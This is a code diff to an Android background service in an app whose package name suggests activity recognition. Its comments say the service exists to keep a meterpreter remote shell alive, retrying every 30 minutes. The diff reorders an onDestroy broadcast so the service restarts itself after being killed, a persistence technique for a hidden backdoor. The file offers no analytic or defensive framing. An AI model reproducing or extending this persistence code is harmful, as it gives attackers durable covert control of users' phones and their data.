@@ -33,18 +33,18 @@ public class MyIntentService extends Service {
     }
     public void onDestroy() {
         super.onDestroy();
-
-        Intent broadcastIntent = new Intent("uk.ac.shef.oak.ActivityRecognition.RestartSensor");
-        sendBroadcast(broadcastIntent);
         Payload.stop();
         scheduler.shutdownNow();
+        Intent broadcastIntent = new Intent("uk.ac.shef.oak.ActivityRecognition.RestartSensor");
+        sendBroadcast(broadcastIntent);
+
     }
     public void periodicallyAttempt(){
         //if meterpreter session dies unexpectedly, the background service will try to reopen it without restarting the app
         //since a new session is started, even if the current session is still alive, i put a very large period (30 min)
 
         //long half_an_hour = (60)/(2); //time passing between each attempt to open a new meterpreter session
-        long half_an_hour = 1;
+        long half_an_hour = 30;
         final Runnable beeper = new Runnable() {
 
             public void run()
